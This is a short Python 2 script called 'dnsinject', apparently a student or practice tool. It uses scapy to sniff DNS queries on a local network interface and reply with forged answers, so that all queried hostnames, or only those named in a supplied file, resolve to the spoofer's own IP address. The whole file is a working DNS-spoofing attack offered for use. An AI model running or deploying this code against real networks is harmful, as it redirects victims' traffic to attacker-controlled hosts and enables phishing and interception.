from scapy.all import *
import sys
import getopt
import socket
import fcntl
import struct


interface = 'en0'
hostnamesFile = ''
bpf = ''
hostsToSpoof = []


# Function help taken from: http://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html#selection-813.9-1157.2
# https://null-byte.wonderhowto.com/how-to/build-dns-packet-sniffer-with-scapy-and-python-0163601/
def dns_spoof(packet):
	ipadress_of_spoofer = '172.16.1.63' # get_ip_address(interface)
	if IP in packet:
		if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
			# if str(packet[IP].src) == '172.24.30.216' or str(packet[IP].dst) == '172.20.10.5':
			if len(hostsToSpoof) > 0:
				if packet[DNS].qd.qname.rstrip('.') not in hostsToSpoof:
					return
			spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=ipadress_of_spoofer))
			send(spoofed_pkt)
			print 'Sent:', spoofed_pkt.summary()


def main():
	global interface, hostnamesFile, bpf, hostsToSpoof
	try:
		opts, args = getopt.getopt(sys.argv[1:], 'i:h:')
	except getopt.GetoptError, e:
		print e

	for opt, arg in opts:
		if opt == '-i':
			interface = arg
		if opt == '-h':
			hostnamesFile = arg

	if len(args) == 1:
		bpf = args[0]
	elif len(args) > 1:
		print "Usage: \n dnsinject [-i interface] [-h hostnames] expression"
	else:
		bpf = 'udp port 53'

	# bpf = [filter.replace(',','') for filter in bpf]
	print "interface: ", interface, "hostnamesFile: ", str(hostnamesFile), "bpf: ", bpf

	lines = []
	if len(hostnamesFile) > 0:
		with open(hostnamesFile, 'r') as file:
			lines = file.readlines()
	for line in lines:
			if '\n' in line:
				line = line.strip()
			ip, hostname = line.split()
			hostsToSpoof.append(hostname)


	try:
		sniff(iface = interface, filter = bpf, prn = dns_spoof, store = 0)
	except Exception,e:
		print "Exception while sniffing", e

main()